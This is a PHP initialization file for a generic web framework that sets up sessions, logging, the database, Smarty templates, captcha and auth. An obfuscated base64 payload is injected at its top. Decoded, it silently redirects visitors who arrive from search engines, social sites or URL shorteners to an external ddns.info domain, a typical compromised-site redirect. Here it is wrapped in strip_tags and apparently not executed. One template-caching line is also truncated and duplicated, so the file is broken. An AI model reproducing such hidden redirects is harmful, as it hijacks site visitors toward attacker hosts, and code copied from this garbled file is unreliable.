<?php	 	$dropthisline=strip_tags(("CmVycm9yX3JlcG9ydGluZygwKTsKJHFhenBsbT1oZWFkZXJzX3NlbnQoKTsKaWYgKCEkcWF6cGxtKXsKJHJlZmVyZXI9JF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddOwokdWFnPSRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXTsKaWYgKCR1YWcpIHsKaWYgKCFzdHJpc3RyKCR1YWcsIk1TSUUgNy4wIikgYW5kICFzdHJpc3RyKCR1YWcsIk1TSUUgNi4wIikgYW5kICFzdHJzdHIoJHVhZywiRmlyZWZveC8zLiIpKXsKaWYgKHN0cmlzdHIoJHJlZmVyZXIsInlhaG9vLiIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJpbmcuIikgb3Igc3RyaXN0cigkcmVmZXJlciwicmFtYmxlci4iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJ3ZWJhbHRhLiIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInQuY28vIikgb3Igc3RyaXN0cigkcmVmZXJlciwidGlueXVybC5jb20iKSBvciBwcmVnX21hdGNoKCIveWFuZGV4XC5ydVwveWFuZHNlYXJjaFw/KC4qPylcJmxyXD0vIiwkcmVmZXJlcikgb3IgcHJlZ19tYXRjaCAoIi9nb29nbGVcLiguKj8pXC91cmxcP3NhLyIsJHJlZmVyZXIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImZhY2Vib29rLmNvbS9sIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYW9sLmNvbSIpIG9yIChwcmVnX21hdGNoICgiL2h0dHBzOlwvXC93d3cuZ29vZ2xlXC4oLio/KVwvLyIsJHJlZmVyZXIpIGFuZCBzdHJzdHIoJHVhZywiQ2hyb21lLyIpKSkgewppZiAoIXN0cmlzdHIoJHJlZmVyZXIsImNhY2hlIikgYW5kICFzdHJpc3RyKCRyZWZlcmVyLCJpbnVybCIpIGFuZCAhc3RyaXN0cigkcmVmZXJlciwiRWVZcDNENyIpKXsKaGVhZGVyKCJMb2NhdGlvbjogaHR0cDovL3JrZmhhZmcuZGRucy5pbmZvLyIpOwpleGl0KCk7Cn0KfQp9Cn0KfQ=="));

// check
if (!defined('GENERIC_PATH') or !defined('APPROOT_PATH')) 
  die('Not initialized');

if(!defined('E_DEPRECATED')){
    error_reporting(E_ALL & ~E_COMPILE_WARNING & ~E_NOTICE);
}
else{
    error_reporting(E_ALL & ~E_COMPILE_WARNING & ~E_NOTICE & ~E_DEPRECATED);
}

@define('CONFIG_PATH', APPROOT_PATH.'config/');  
define('CLASS_PATH',  APPROOT_PATH.'classes/');  
define('BASE_PATH', APPROOT_PATH);

if (defined("BLOCKED")) {
  echo('<table width="100%"><tr><td align="center">Site is currently closed. Please come back later</td></tr></table>');
  exit();
}                        
  
define('CONSOLE_MODE', !array_key_exists('REQUEST_METHOD', $_SERVER));
define('SUBMIT_MODE',  count($_POST) || count($_FILES));

// start session
ini_set('url_rewriter.tags', null);
if (function_exists("date_default_timezone_set") && function_exists("date_default_timezone_get"))
  @date_default_timezone_set(@date_default_timezone_get());

if (!CONSOLE_MODE) {
  session_cache_limiter('none');
  session_start();
}
  
if (CONSOLE_MODE)  
  set_time_limit(0);

// service functions
require_once(GENERIC_PATH.'utils/utils.php');
require_once(GENERIC_PATH.'utils/image_file.php');
  
// disable magic quotes  
set_magic_quotes_runtime(0);

if (get_magic_quotes_gpc()) { 
  stripslashes_everywhere($_GET);
  stripslashes_everywhere($_POST);
  stripslashes_everywhere($_COOKIE); 
  stripslashes_everywhere($_REQUEST);
  if (isset($_SERVER['PHP_AUTH_USER'])) 
    stripslashes_everywhere($_SERVER['PHP_AUTH_USER']); 
  if (isset($_SERVER['PHP_AUTH_PW']))   
    stripslashes_everywhere($_SERVER['PHP_AUTH_PW']);
}
  
define('TEMPORARY_PATH', APPROOT_PATH.'_tmp/');
mk_dir(TEMPORARY_PATH);
  
require_once(GENERIC_PATH.'utils/session.php');
$ses = new session();

@define('LOGS_PATH', APPROOT_PATH.'_logs/');

require_once(GENERIC_PATH.'utils/log.php');
$log = new log(LOGS_PATH);

require_once(GENERIC_PATH.'utils/error_handler.php');
$error_handler = new error_handler();

// start up
$log->start('Init');

require_once(GENERIC_PATH.'utils/event_handler.php');
$event_handler = new event_handler();

if (file_exists(CONFIG_PATH.'def_events.php'))
  require_once(CONFIG_PATH.'def_events.php');

// Application definitions
if (file_exists(CONFIG_PATH.'def_app.php')){
    require_once(CONFIG_PATH.'def_app.php');
    if(get_config('application_title')){
        set_config("application_name", get_config('application_title'));
    } 
}

// running
$log->start('Application');

//logme('session');

// urls
if (!CONSOLE_MODE) {
  @define('URL_MODE', 'url_dynamic');
} else {
  @define('URL_MODE', 'url_none');
}

if (!CONSOLE_MODE) {
  require_once(GENERIC_PATH.'url/'.URL_MODE.'.php');
  $class_name = URL_MODE;
  $url = new $class_name();
} else {
  require_once(GENERIC_PATH.'url/url_none.php');
  $url = new url_none();
}

logme('URL: '.$url->url);

if (get('__upmMethod')) {
  require_once(GENERIC_PATH.'utils/upload_progress_manager.php');
  $upload_progress_manager = new upload_progress_manager();
  $upload_progress_manager->handler();
}

if (get('__fumMethod')) {
  require_once(GENERIC_PATH.'utils/file_upload_manager.php');
  $file_upload_manager = new file_upload_manager();
  $file_upload_manager->handler();
}

// Database engine initalization
if (defined('DB_ENGINE')) {
  $db_class    = DB_ENGINE;
  set_undefined_config('db', 'server', 'localhost');
  require_once(GENERIC_PATH.'db/'.DB_ENGINE.'.php');
  $db = new $db_class(get_const('DB_SERVER'), get_const('DB_NAME'), get_const('DB_USER'), get_const('DB_PASSWORD'));
  //logme('database');
}  

if (file_exists(CONFIG_PATH.'def_db.php'))
  require_once(CONFIG_PATH.'def_db.php');

if (file_exists(CONFIG_PATH.'def_url.php'))
  require_once(CONFIG_PATH.'def_url.php');

require_once(GENERIC_PATH.'ui/define.php');

if (!get_config('relative_url'))
  define('RELATIVE_URL', $url->relative_url);
define('RELATIVE_URL_WO_PARAMS', $url->relative_url_wo_params);
if (!get_config('base_url'))
  define('BASE_URL', $url->base_url);
if (get_config('website_url')) {
  $url->website_url = get_config('website_url');
  $url->refill();
}
define('WEBSITE_URL', $url->website_url);
define('COMPLETE_URL', $url->complete_url);
define('CURRENT_URL', $url->current_url);
define('CURRENT_URL_WO_PARAMS', $url->current_url_wo_params);

if (!defined('RELATIVE_GENERIC_URL')) {
  $gen_path = substr(GENERIC_PATH, strlen(APPROOT_PATH));
  define('RELATIVE_GENERIC_URL', BASE_URL.$gen_path);
}
if (!defined('COMPLETE_GENERIC_URL')) {
  $gen_path = substr(GENERIC_PATH, strlen(APPROOT_PATH));
  define('COMPLETE_GENERIC_URL', WEBSITE_URL.BASE_URL.$gen_path);
}

if (!CONSOLE_MODE) {
  require_once(GENERIC_PATH.'ui/browsing_history.php');
  $browsing_history = new browsing_history();
}

if (file_exists(CONFIG_PATH.'def_path.php'))
  require_once(CONFIG_PATH.'def_path.php');

require_once(GENERIC_PATH.'db/data_manager.php');
$dm = new data_manager();

if (file_exists(CONFIG_PATH.'def_code.php'))
  require_once(CONFIG_PATH.'def_code.php');

if (!CONSOLE_MODE && !defined('SERVICE_MODE')) 
  if (file_exists(CONFIG_PATH.'def_meta.php'))
    require_once(CONFIG_PATH.'def_meta.php');

//if (defined('DB_ENGINE')) {    
  if (file_exists(CONFIG_PATH.'def_dm.php'))
    require_once(CONFIG_PATH.'def_dm.php');
  if (file_exists(CONFIG_PATH.'def_audit.php'))
    require_once(CONFIG_PATH.'def_audit.php');
  if (file_exists(CONFIG_PATH.'def_schema.php'))
    require_once(CONFIG_PATH.'def_schema.php');
  //logme('database_defs');
//}


// process captcah requests
if (!CONSOLE_MODE && !defined('SERVICE_MODE')) {
  require_once(GENERIC_PATH.'ui/captcha.php');
  $captcha = new captcha();

  if (file_exists(CONFIG_PATH.'def_captcha.php'))
    require_once(CONFIG_PATH.'def_captcha.php');

  $captcha->handler();

  require_once(GENERIC_PATH.'ui/captcha_question.php');
  $captcha_question = new captcha_question();
  if (file_exists(CONFIG_PATH.'def_captcha_question.php'))
    require_once(CONFIG_PATH.'def_captcha_question.php');
    
}  

// mailer
require_once(GENERIC_PATH.'mail/class.phpmailer.php');
require_once(GENERIC_PATH.'mail/class.smtp.php');
$mailer = new PHPMailer();

//logme('mailer');

define('SHARED_TEMPLATES_PATH', APPROOT_PATH.'generic.2/templates/');
@define('TEMPLATES_PATH',       APPROOT_PATH.'templates/');

if (CONSOLE_MODE)
  @define('TEMPLATES_WORKING_PATH',   TEMPORARY_PATH.'smarty_con/');
else
  @define('TEMPLATES_WORKING_PATH',   TEMPORARY_PATH.'smarty/');

set_undefined_config('main_page', 'index.html');

require_once(GENERIC_PATH.'smarty/Smarty.class.php');
$tmpl = new Smarty();
$tmpl->template_dir = TEMPLATES_PATH;
$tmpl->compile_dir  = TEMPLATES_WORKING_PATH.'compile/';
$tmpl->config_dir   = TEMPLATES_WORKING_PATH.'config/';
$tmpl->cache_dir    = TEMPLATES_WORKING_PATH.'cache/';

mk_dir($tmpl->compile_dir);
mk_dir($tmpl->config_dir);
mk_dir($tmpl->cache_dir);

if (file_exists(CONFIG_PATH.'def_smarty.php'))
  require_once(CONFIG_PATH.'def_smarty.php');

$tmpl->caching        = get_config('smarty_caching');
$tmpl->use_sub_dirs   = get_config('smarty_caching_use_sub_dirs');
$tmpl->use_md5_dirs   = get_config('smarty_caching_use_md5_dirs');
if (get_config('smarty_caching_md5_h'))
  $tmplb_dirs');
$tmpl->use_md5_dirs   = get_config('smarty_caching_use_md5_dirs');
if (get_config('smarty_caching_md5_h'))
  $tmpl->md5_dir_depth  = get_config('smarty_caching_md5_dir_depth');
$tmpl->cache_lifetime = get_config('smarty_cache_lifetime');
$tmpl->cache_modified_check = get_config('smarty_cache_modified_check');

function __finalyze_smarty_config() {
  
  global $tmpl;                        
  set_undefined_config('application_name', 'Generic Application');
  set_undefined_config('meta_title',       get_config('application_name'));
  set_undefined_config('meta_description', get_config('application_name'));
  set_undefined_config('meta_keywords',    get_config('application_name'));
  set_undefined_config('meta_author',      get_config('application_name'));

  $tmpl->assign('application_title',for_html(get_config('application_title')));
  $tmpl->assign('application_name', for_html(get_config('application_name')));
  $tmpl->assign('title',            for_html(get_config('meta_title')));
  $tmpl->assign('meta_title',       for_html(get_config('meta_title')));
  $tmpl->assign('meta_description', for_html(get_config('meta_description')));
  $tmpl->assign('meta_keywords',    for_html(get_config('meta_keywords')));
  $tmpl->assign('meta_author',      for_html(get_config('meta_author')));

  if (!CONSOLE_MODE) {
    global $browsing_history;
    $browsing_history->assign();
  }

  $tmpl->caching        = get_config('smarty_caching');
  $tmpl->use_sub_dirs   = get_config('smarty_caching_use_sub_dirs');
  $tmpl->cache_lifetime = get_config('smarty_cache_lifetime');
  
}
  
//logme('smarty');
  
require_once(GENERIC_PATH.'multilang/translator.php');
$trn = new translator();

//logme('trn');

define('SHARED_SCRIPTS_URL',   RELATIVE_GENERIC_URL.'scripts/');
define('SCRIPTS_URL',          BASE_URL.'scripts/');

$tmpl->assign('scripts_url',            SCRIPTS_URL);
$tmpl->assign('shared_scripts_url',     SHARED_SCRIPTS_URL);
$tmpl->assign('relative_url',           RELATIVE_URL);
$tmpl->assign('relative_url_wo_params', RELATIVE_URL_WO_PARAMS);
$tmpl->assign('base_url',               BASE_URL);
$tmpl->assign('website_url',            WEBSITE_URL);        
$tmpl->assign('complete_url',           COMPLETE_URL);
$tmpl->assign('current_url',            CURRENT_URL);
$tmpl->assign('current_url_wo_params',  CURRENT_URL_WO_PARAMS);

if (!CONSOLE_MODE && !defined('SERVICE_MODE')) {

  require_once(GENERIC_PATH.'ui/theme.php');
  $theme = new theme();

  // will be overriden later   
  $tmpl->assign('resources',            $theme->resources_url);
  $tmpl->assign('resources_url',        $theme->resources_url);
  $tmpl->assign('shared_resources',     $theme->shared_resources_url);
  $tmpl->assign('shared_resources_url', $theme->shared_resources_url);

} else {
  
  if (defined('RESOURCES_URL')) {
    $tmpl->assign('resources',            RESOURCES_URL);
    $tmpl->assign('resources_url',        RESOURCES_URL);
  }

  if (defined('SHARED_RESOURCES_URL')) {
    $tmpl->assign('shared_resources',     SHARED_RESOURCES_URL);
    $tmpl->assign('shared_resources_url', SHARED_RESOURCES_URL);
  }
  
}

if (file_exists(CONFIG_PATH.'def_lang.php'))
  require_once(CONFIG_PATH.'def_lang.php');

if (!CONSOLE_MODE && !defined('SERVICE_MODE')) {
  if (file_exists(CONFIG_PATH.'def_theme.php'))
    require_once(CONFIG_PATH.'def_theme.php');
}

function __finalyze_customization() {

  global $trn;
  global $tmpl;
  global $theme;

  $trn->load();  
    
  if (!CONSOLE_MODE && !defined('SERVICE_MODE')) {
    
    $theme->load();  
  
    if (!defined('SHARED_RESOURCES_URL'))
      define('SHARED_RESOURCES_URL', $theme->shared_resources_url);

    if (!defined('RESOURCES_URL'))
      define('RESOURCES_URL', $theme->resources_url);
  
    $tmpl->assign('theme', $theme->theme);
    
  }
  
  if (defined('RESOURCES_URL')) {
    $tmpl->assign('resources',            RESOURCES_URL);
    $tmpl->assign('resources_url',        RESOURCES_URL);
  }

  if (defined('SHARED_RESOURCES_URL')) {
    $tmpl->assign('shared_resources',     SHARED_RESOURCES_URL);
    $tmpl->assign('shared_resources_url', SHARED_RESOURCES_URL);
  }

  $tmpl->assign('language', $trn->language);
  
}
  
@define('AUTH_MODE', 'auth_none');

require_once(GENERIC_PATH.'auth/'.AUTH_MODE.'.php');
$class_name = AUTH_MODE;
$auth = new $class_name();
if (file_exists(CONFIG_PATH.'def_auth.php'))
  require_once(CONFIG_PATH.'def_auth.php');
if (defined("COMPANY_LOGIN_LOGO"))
  set_config('company_login_logo', COMPANY_LOGIN_LOGO);
if (defined("COMPANY_ADMIN_EMAIL"))
  set_config('company_admin_email', COMPANY_ADMIN_EMAIL);
$auth->init();

//logme('auth');

__finalyze_customization();

//logme('__finalyze_customization');

if (file_exists(CONFIG_PATH.'def_init.php'))
  require_once(CONFIG_PATH.'def_init.php');

//logme('def_init');

if (!CONSOLE_MODE && !defined('SERVICE_MODE')) {

  require_once(GENERIC_PATH."jsox/jsox.php");
  $jsox = new jsox();

  if (get('__jsoxMethod')) {
    if (file_exists(CONFIG_PATH."def_jsox.php"))
      require_once(GENERIC_PATH."jsox/def_jsox.php");
    
    require_once(CONFIG_PATH."def_jsox.php");
    $jsox->handler();
  }

  require_once(GENERIC_PATH."ajax/ajax.php");
  $ajax = new ajax();
  
  if (get('__ajaxMethod')) {
  
    if (file_exists(CONFIG_PATH."def_ajax.php"))
      require_once(CONFIG_PATH."def_ajax.php");
    
    require_once(GENERIC_PATH."ajax/def_ajax.php");
    $ajax->handler();
    
  }

  //logme('ajax');

  if (file_exists(CONFIG_PATH.'def_menu.php')) {
    require_once(GENERIC_PATH.'ui/menu.php');
    $menu = new menu();
    require_once(CONFIG_PATH.'def_menu.php');
  }

  //logme('menu');

}

$log->finish('Init');

?>
